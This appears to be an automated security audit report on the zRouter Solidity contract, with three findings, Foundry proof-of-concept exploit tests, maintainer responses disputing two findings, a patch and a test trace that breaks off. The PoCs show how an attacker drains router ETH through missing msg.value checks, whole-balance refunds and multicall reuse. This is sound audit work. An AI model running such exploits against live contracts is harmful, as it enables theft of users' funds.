# Audited by [V12](https://zellic.ai/)

The only autonomous Solidity auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.


---

# ETH value not bound to actions
**#1**
- Severity: Critical
- Validity: Invalid

## Targets
- swapV2 (zRouter)
- swapV4 (zRouter)
- swapVZ (zRouter)
- deposit (zRouter)
- revealName (zRouter)

## Affected Locations
- **zRouter.swapV2**: The ETH path wraps `amountIn` via `wrapETH(...)` but does not enforce `msg.value >= amountIn`, so the missing value check allows the wrap to be funded by the router’s pre-existing ETH balance.
- **zRouter.swapV4**: The function only derives `swapAmount` from `msg.value` in one branch and otherwise never validates sufficiency, so ETH settlement can be paid from router-held ETH rather than caller-provided ETH.
- **zRouter.swapVZ**: The function forwards user-specified `swapAmount`/`amountLimit` as call value without requiring it to match `msg.value`, enabling spending of unrelated ETH already sitting in the contract.
- **zRouter.deposit**: When `token == address(0)` and `msg.value == 0`, the function still calls `depositFor` without proving any ETH was transferred, allowing internal ETH credit to be minted against the router’s existing ETH balance.
- **zRouter.revealName**: It computes payment from `address(this).balance` and ignores the result of `_useTransientBalance`, so there is no enforcement that the ETH being spent was credited/provided for this caller.

## Description

Multiple router entry points treat native ETH as an input/payment source without strictly binding the required ETH amount to `msg.value`. In `swapV2`, `swapV4`, and `swapVZ`, callers can specify (or cause computation of) an ETH input larger than what they actually sent, and the router will make up the difference from its existing ETH balance. Separately, `deposit` can credit an ETH deposit via `depositFor` even when `msg.value` is zero, and `revealName` spends `address(this).balance` while ignoring whether any transient balance was actually credited for the caller. Because the router can accumulate ETH from prior swaps, refunds, forced transfers, or other users’ deposits, these flows let arbitrary callers spend pooled router ETH to obtain swap outputs or NFTs. Fixing this requires enforcing exact `msg.value` requirements (or explicit, tracked internal credits) whenever native ETH is the input or payment source, and rejecting calls that attempt to spend more ETH than was provided/credited for that specific operation.

## Root cause

The router uses the contract’s existing ETH balance (directly or via wrapping/forwarding) without enforcing `msg.value`/credited-balance sufficiency for the specific caller action.

## Impact

An attacker can underpay (or pay nothing) for ETH-input swaps or ETH-denominated actions and still receive the output asset/NFT, with the router subsidizing the difference from its own ETH. This can drain ETH held by the router on behalf of other users or protocol operations and leave internal accounting undercollateralized.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

interface IToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockWETH {
    mapping(address => uint256) public balanceOf;

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockV2Pool {
    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;

    function initialize(address _token0, address _token1) external {
        token0 = _token0;
        token1 = _token1;
    }

    function setReserves(uint112 r0, uint112 r1) external {
        reserve0 = r0;
        reserve1 = r1;
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata) external {
        if (amount0Out > 0) IToken(token0).transfer(to, amount0Out);
        if (amount1Out > 0) IToken(token1).transfer(to, amount1Out);
    }
}

contract ZRouterTest is Test {
    address constant V2_FACTORY_ADDR = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    bytes32 constant V2_POOL_HASH =
        0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f;
    address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function _computeV2Pool(address tokenA, address tokenB) internal pure returns (address) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", V2_FACTORY_ADDR, salt, V2_POOL_HASH)))));
    }

    function testSwapV2UsesRouterEthBalance() public {
        zRouter router = new zRouter();
        MockERC20 tokenOut = new MockERC20();

        MockWETH wethImpl = new MockWETH();
        vm.etch(WETH_ADDR, address(wethImpl).code);

        address poolAddr = _computeV2Pool(WETH_ADDR, address(tokenOut));
        MockV2Pool poolImpl = new MockV2Pool();
        vm.etch(poolAddr, address(poolImpl).code);

        MockV2Pool(poolAddr).initialize(
            WETH_ADDR < address(tokenOut) ? WETH_ADDR : address(tokenOut),
            WETH_ADDR < address(tokenOut) ? address(tokenOut) : WETH_ADDR
        );
        MockV2Pool(poolAddr).setReserves(100 ether, 1000 ether);

        tokenOut.mint(poolAddr, 2_000 ether);

        address liquidityProvider = address(0xBEEF);
        vm.deal(liquidityProvider, 5 ether);
        vm.prank(liquidityProvider);
        (bool ok,) = address(router).call{value: 5 ether}("");
        require(ok, "funding failed");

        address attacker = address(0xA11CE);
        uint256 routerEthBefore = address(router).balance;
        uint256 attackerTokenBefore = tokenOut.balanceOf(attacker);

        vm.prank(attacker);
        router.swapV2(attacker, false, address(0), address(tokenOut), 1 ether, 0, block.timestamp + 1);

        uint256 attackerTokenAfter = tokenOut.balanceOf(attacker);
        uint256 routerEthAfter = address(router).balance;

        assertGt(attackerTokenAfter, attackerTokenBefore, "attacker received no tokens");
        assertEq(routerEthAfter, routerEthBefore - 1 ether, "router did not subsidize ETH input");
    }
}
```

## Remediation

**Status:** Error

### Explanation

Enforce that ETH‑input swaps consume only the caller’s provided funds by checking that `msg.value` (or the caller’s credited balance) covers the required input, using exactly that amount to wrap/forward for the swap, refunding any excess, and never drawing from the router’s pre‑existing ETH balance.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

> ### Response
> **Non-issue — by design.** The zRouter is a stateless, atomic execution router. It is not designed to hold ETH between transactions. All swap functions operate within a single atomic transaction (typically via `multicall`), and transient storage (EIP-1153) tracks per-call balances within that context. The PoC relies on artificially funding the router with ETH via `receive()`, which does not occur in normal operation — no user flow results in ETH sitting on the router across transactions. There is no custody model. The `receive()` function exists solely to accept ETH refunds from WETH unwraps and protocol callbacks within the same transaction. Any ETH sent to the router outside a multicall context is simply lost by the sender, not exploitable by a third party.

---

# Refund/sweep uses total router balance
**#2**
- Severity: Critical
- Validity: Invalid

## Targets
- swapV3 (zRouter)
- unlockCallback (zRouter)
- swapVZ (zRouter)
- swapCurve (zRouter)
- exactETHToWSTETH (zRouter)

## Affected Locations
- **zRouter.swapV3**: After swapping, it sets the refund amount to `address(this).balance` and sends it to `msg.sender`, so fixing this location to refund only the swap’s unused ETH prevents sweeping unrelated router ETH.
- **zRouter.unlockCallback**: It computes `ethRefund` as `address(this).balance` and sends it to `payer`, so replacing this with swap-scoped surplus tracking prevents refunding unrelated ETH.
- **zRouter.swapVZ**: The exact-out refund transfers the router’s entire ETH/token balance based on `address(this).balance`/`balanceOf(tokenIn)`, so switching to pre/post balance delta (and subtracting pre-swap reserves) prevents balance sweeping.
- **zRouter.swapCurve**: It refunds `address(this).balance` or `balanceOf(firstToken)` instead of only the unused input, so refunding the correct surplus delta remediates the sweep.
- **zRouter.exactETHToWSTETH**: `wstOut` is set to the router’s total `WSTETH` balance and transferred out, so computing `wstOut` as the minted delta (post minus pre balance) and requiring a positive deposit prevents draining pre-existing `WSTETH`.

## Description

Several functions compute refunds or outputs using `address(this).balance` or `balanceOf(...)` and then transfer that entire balance to the caller, rather than refunding only the swap-specific unused input or transferring only the newly-minted amount. In `swapV3` and `unlockCallback`, the ETH refund amount is derived from the router’s total ETH balance, so any ETH held for other users/operations is treated as refundable to the current caller/payer. In `swapVZ` and `swapCurve` exact-out branches, the refund logic similarly uses the router’s total holdings of the input asset, enabling a caller to “refund” themselves all existing balances of `tokenIn`/ETH. `exactETHToWSTETH` repeats the same pattern by transferring the router’s entire `WSTETH` balance rather than the delta minted by the current call. The remediation is to track pre/post balances (or per-swap accounting) and refund/transfer only the correct delta attributable to the current action, never the contract’s entire standing balance.

## Root cause

Refund and payout amounts are calculated from the contract’s total asset balances instead of the per-call unused input or newly-created output deltas.

## Impact

An attacker can trigger swaps or conversions that cause the router to transfer out all ETH or a chosen token balance it currently holds, including other users’ deposits and operational funds. This breaks custody/accounting and can render the router insolvent for legitimate withdrawals or subsequent swaps.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

contract ZRouterRefundPOC is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint24 constant FEE = 500; // Uniswap V3 0.05%
    string constant MAINNET_RPC = "https://ethereum-rpc.publicnode.com";

    function setUp() public {
        vm.createSelectFork(MAINNET_RPC, 24_557_000);
        vm.txGasPrice(0);
    }

    function test_swapV3RefundsEntireRouterBalance() public {
        zRouter router = new zRouter();
        address victim = address(0xBEEF);
        address attacker = address(0xBAD0);

        uint256 initialRouterBalance = address(router).balance;

        uint256 victimDeposit = 1 ether;
        vm.deal(victim, victimDeposit);
        vm.prank(victim);
        (bool ok,) = address(router).call{value: victimDeposit}("");
        assertTrue(ok, "victim deposit failed");
        assertEq(address(router).balance, initialRouterBalance + victimDeposit);

        uint256 swapAmount = 1e15; // 0.001 ETH exact-in
        vm.deal(attacker, 0); // attacker pays no ETH
        uint256 attackerBefore = attacker.balance;

        vm.prank(attacker);
        router.swapV3(attacker, false, FEE, address(0), USDC, swapAmount, 0, block.timestamp + 1);

        uint256 attackerAfter = attacker.balance;
        uint256 expectedRefund = initialRouterBalance + victimDeposit - swapAmount;
        assertEq(attackerAfter - attackerBefore, expectedRefund, "attacker drains router ETH via refund");
        assertEq(address(router).balance, 0, "router balance should be emptied by refund");
    }
}
```

## Remediation

**Status:** Error

### Explanation

Calculate refunds and payouts based on per-call deltas: record the router’s token/ETH balances before the swap, perform the swap, and refund/send only the exact unused input and actual output computed from balance changes or return values, never the full contract balance. If needed, maintain explicit per‑user accounting for deposits/credits so any transfer is limited to the caller’s own deltas rather than shared funds.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

> ### Response
> **Non-issue — by design.** Same reasoning as #1. The router is stateless and does not custody ETH or tokens between transactions. Using `address(this).balance` for refunds within an atomic swap flow is intentional — at that point in execution, the balance reflects only the current transaction's state (e.g., ETH received via `msg.value` minus what was consumed by the swap). The PoC requires artificially pre-funding the router with ETH via a direct transfer, which is not a realistic scenario — no user flow or protocol interaction results in persistent ETH balances on the router. The refund pattern `_safeTransferETH(msg.sender, address(this).balance)` correctly returns unused ETH to the caller within the atomic context.

---

# Multicall reuses msg.value across delegatecalls
**#3**
- Severity: Critical
- Validity: Acknowledged

## Targets
- multicall (zRouter)
- ethToExactSTETH (zRouter)

## Affected Locations
- **zRouter.multicall**: It uses `delegatecall` without tracking remaining ETH, so adding shared value accounting (or redesigning to non-delegatecall with explicit per-call value) is required to prevent repeated consumption/refunds of the same `msg.value`.
- **zRouter.ethToExactSTETH**: Its refund calculation uses `callvalue()` and transfers ETH back to `msg.sender`, which under multicall can execute repeatedly and pay out excess ETH from the router’s standing balance.

## Description

`multicall` batches internal operations via `delegatecall`, which preserves the original `msg.value` for every subcall. Because the router’s payable functions and refund logic often interpret `msg.value`/`callvalue()` as the ETH budget for that specific call, the same ETH appears to be available multiple times within one batch. This enables repeated crediting (multiple payable subcalls each acting as if the full ETH was provided) and repeated refunding (each subcall refunding as if prior refunds/spends did not occur). The described `ethToExactSTETH` refund path is especially dangerous under multicall because it can refund the full outer `msg.value` multiple times, with excess refunds coming from the router’s existing ETH balance. The fix is to implement explicit per-subcall ETH accounting in `multicall` (e.g., passing value explicitly with `call`, or tracking and decrementing a remaining-value variable) and to make refund/credit functions consume from that tracked budget rather than relying on raw `msg.value` under delegatecall.

## Root cause

`delegatecall`-based batching preserves `msg.value` for each subcall, but the router lacks shared accounting to prevent the same ETH from being credited/refunded multiple times within one multicall.

## Impact

An attacker can send ETH once and obtain multiple credits or multiple refunds in a single transaction, with any over-refund paid out of ETH already held by the router. This can drain the router’s ETH and can also inflate internal balances that are later redeemed for real assets.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

contract ZRouterMulticallMsgValuePOC is Test {
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 24_557_000);
        vm.txGasPrice(0);
    }

    function test_multicall_reuses_msgvalue_refund() public {
        zRouter router = new zRouter();
        address attacker = address(0xBEEF);

        // Fund router with ETH float so over-refunds can be paid out of its balance.
        vm.deal(address(this), 20 ether);
        uint256 routerBalanceBeforeFunding = address(router).balance;
        payable(address(router)).transfer(10 ether);

        uint256 routerBalanceBefore = address(router).balance;
        assertEq(routerBalanceBefore, routerBalanceBeforeFunding + 10 ether);

        // Attacker funds a single ETH payment for the multicall.
        vm.deal(attacker, 2 ether);

        uint256 msgValue = 2 ether;
        uint256 exactOut = 0.1 ether; // small exact-out to force refunds per subcall

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(router.ethToExactSTETH.selector, attacker, exactOut);
        calls[1] = abi.encodeWithSelector(router.ethToExactSTETH.selector, attacker, exactOut);

        uint256 attackerEthBefore = attacker.balance;
        uint256 attackerStEthBefore = IERC20Minimal(STETH).balanceOf(attacker);

        vm.prank(attacker);
        router.multicall{value: msgValue}(calls);

        uint256 attackerEthAfter = attacker.balance;
        uint256 attackerStEthAfter = IERC20Minimal(STETH).balanceOf(attacker);
        uint256 routerBalanceAfter = address(router).balance;

        // Attacker receives the refund twice (once per delegatecall), netting extra ETH.
        assertGt(attackerEthAfter, attackerEthBefore, "attacker ETH should increase after multicall");

        // Router balance is drained by the duplicated refund/payment.
        assertEq(routerBalanceAfter, routerBalanceBefore - msgValue, "router balance drained by reused msg.value");

        // Attacker receives the exact-out stETH twice while paying only once.
        assertGt(attackerStEthAfter - attackerStEthBefore, exactOut, "attacker receives stETH twice");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Track the pre-multicall ETH balance and revert when any subcall reduces `address(this).balance` below that baseline so a batch cannot spend or refund more ETH than the outer `msg.value` provided.

### Patch

```diff
diff --git a/src/zRouter.sol b/src/zRouter.sol
--- a/src/zRouter.sol
+++ b/src/zRouter.sol
@@ -742,6 +742,10 @@
     // ** MULTISWAP HELPER
 
     function multicall(bytes[] calldata data) public payable returns (bytes[] memory results) {
+        uint256 balanceBefore;
+        unchecked {
+            balanceBefore = address(this).balance - msg.value;
+        }
         results = new bytes[](data.length);
         for (uint256 i; i != data.length; ++i) {
             (bool ok, bytes memory result) = address(this).delegatecall(data[i]);
@@ -750,6 +754,7 @@
                     revert(add(result, 0x20), mload(result))
                 }
             }
+            if (address(this).balance < balanceBefore) revert InvalidMsgVal();
             results[i] = result;
         }
     }
```

### Affected Files

- `src/zRouter.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.34
Solc 0.8.34 finished in 5.08s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/zRouter.sol:1409:5:
     |
1409 |     function balanceOf(address owner, uint256 id) external view returns (uint256 amount);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1378:1:
     |
1378 | function balanceOf(address token) view returns (uint256 amount) {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
 --> test/ZRouter.t.sol:8:5:
  |
8 |     function balanceOf(address account) external view returns (uint256);
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1378:1:
     |
1378 | function balanceOf(address token) view returns (uint256 amount) {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> test/ZRouter.t.sol:12:5:
   |
12 |     address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1184:1:
     |
1184 | address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9207): 'transfer' is deprecated and scheduled for removal. Use 'call{value: <amount>}("")' instead.
  --> test/ZRouter.t.sol:26:9:
   |
26 |         payable(address(router)).transfer(10 ether);
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for test/ZRouter.t.sol:ZRouterMulticallMsgValuePOC
[FAIL: InvalidMsgVal()] test_multicall_reuses_msgvalue_refund() (gas: 5358635)
Traces:
  [3459] ZRouterMulticallMsgValuePOC::setUp()
    ├─ [0] VM::createSelectFork("<rpc url>", 24557000 [2.455e7])
    │   └─ ← [Return] 1
    ├─ [0] VM::txGasPrice(0)
    │   └─ ← [Return]
    └─ ← [Stop]

  [5358635] ZRouterMulticallMsgValuePOC::test_multicall_reuses_msgvalue_refund()
    ├─ [5073364] → new zRouter@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [50505] → new SafeExecutor@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 252 bytes of code
    │   ├─ [43686] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   ├─ [24800] 0x6ca84080381E43938476814be61B779A8bB6a600::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─ emit Approval(from: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit OwnershipTransferred(from: 0x0000000000000000000000000000000000000000, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return] 24574 bytes of code
    ├─ [0] VM::deal(ZRouterMulticallMsgValuePOC: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000000000000000000 [2e19])
    │   └─ ← [Return]
    ├─ [62] zRouter::receive{value: 10000000000000000000}()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(0x000000000000000000000000000000000000bEEF, 2000000000000000000 [2e18])
    │   └─ ← [Return]
    ├─ [14187] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   ├─ [10807] 0x6ca84080381E43938476814be61B779A8bB6a600::balanceOf(0x000000000000000000000000000000000000bEEF) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [211221] zRouter::multicall{value: 2000000000000000000}([0xbd6b76d7000000000000000000000000000000000000000000000000000000000000beef000000000000000000000000000000000000000000000000016345785d8a0000, 0xbd6b76d7000000000000000000000000000000000000000000000000000000000000beef000000000000000000000000000000000000000000000000016345785d8a0000])
    │   ├─ [134144] zRouter::ethToExactSTETH{value: 2000000000000000000}(0x000000000000000000000000000000000000bEEF, 100000000000000000 [1e17]) [delegatecall]
    │   │   ├─ [5323] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getTotalShares() [staticcall]
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [1949] 0x6ca84080381E43938476814be61B779A8bB6a600::getTotalShares() [delegatecall]
    │   │   │   │   └─ ← [Return] 7675704118911513147576285 [7.675e24]
    │   │   │   └─ ← [Return] 7675704118911513147576285 [7.675e24]
    │   │   ├─ [5551] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getTotalPooledEther() [staticcall]
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [2177] 0x6ca84080381E43938476814be61B779A8bB6a600::getTotalPooledEther() [delegatecall]
    │   │   │   │   └─ ← [Return] 9426710484824530183452807 [9.426e24]
    │   │   │   └─ ← [Return] 9426710484824530183452807 [9.426e24]
    │   │   ├─ [49411] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::fallback{value: 100000000000000001}()
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [46173] 0x6ca84080381E43938476814be61B779A8bB6a600::fallback{value: 100000000000000001}() [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0x96a25c8ce0baabc1fdefd93e9ed25d8e092a3332f3aa9a41722b5697231d1d1a
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000016345785d8a00010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 100000000000000000 [1e17])
    │   │   │   │   ├─ emit TransferShares(param0: 0x0000000000000000000000000000000000000000, param1: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 81425054172058723 [8.142e16])
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [33976] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::transferShares(0x000000000000000000000000000000000000bEEF, 81425054172058723 [8.142e16])
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [30590] 0x6ca84080381E43938476814be61B779A8bB6a600::transferShares(0x000000000000000000000000000000000000bEEF, 81425054172058723 [8.142e16]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x000000000000000000000000000000000000bEEF, amount: 100000000000000000 [1e17])
    │   │   │   │   ├─ emit TransferShares(param0: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x000000000000000000000000000000000000bEEF, param2: 81425054172058723 [8.142e16])
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   ├─ [0] 0x000000000000000000000000000000000000bEEF::fallback{value: 1899999999999999999}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [74844] zRouter::ethToExactSTETH{value: 2000000000000000000}(0x000000000000000000000000000000000000bEEF, 100000000000000000 [1e17]) [delegatecall]
    │   │   ├─ [5323] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getTotalShares() [staticcall]
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
